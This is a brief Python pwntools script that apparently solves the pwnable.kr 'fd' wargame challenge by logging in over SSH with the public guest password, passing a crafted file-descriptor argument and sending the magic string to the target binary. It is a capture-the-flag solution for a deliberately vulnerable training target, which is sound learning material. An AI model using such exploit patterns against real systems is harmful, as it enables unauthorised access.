from pwn import *

def solve():
    p = ssh(user = 'fd', host = 'pwnable.kr', port = 2222, password = 'guest')
    path = '/home/fd/fd'
    argv = '4660'
    payload = [path, argv]
    s = p.run(payload)
    s.sendline('LETMEWIN')
    s.interactive()

if __name__ == '__main__':
    solve()